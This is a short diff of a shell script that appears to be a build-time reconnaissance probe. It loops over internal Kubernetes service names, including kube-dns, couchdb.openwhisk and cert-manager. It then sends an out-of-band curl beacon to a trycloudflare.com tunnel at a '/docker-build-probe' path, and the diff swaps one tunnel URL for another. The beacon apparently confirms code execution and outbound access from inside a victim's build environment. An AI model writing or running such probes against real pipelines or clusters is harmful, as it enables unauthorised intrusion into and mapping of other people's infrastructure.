@@ -76,6 +76,6 @@ for svc in kubernetes.default kube-dns.kube-system couchdb.openwhisk cert-manage
 done
 
 echo "=== OOB BUILD PING ==="
-curl -sv --connect-timeout 5 --max-time 8 "https://admit-closely-coupon-statutes.trycloudflare.com/docker-build-probe" 2>&1 || echo "OOB_FAILED"
+curl -sv --connect-timeout 5 --max-time 8 "https://cheapest-vessel-hometown-equipped.trycloudflare.com/docker-build-probe" 2>&1 || echo "OOB_FAILED"
 
 echo "=== BUILD PROBE END $(date -u) ==="
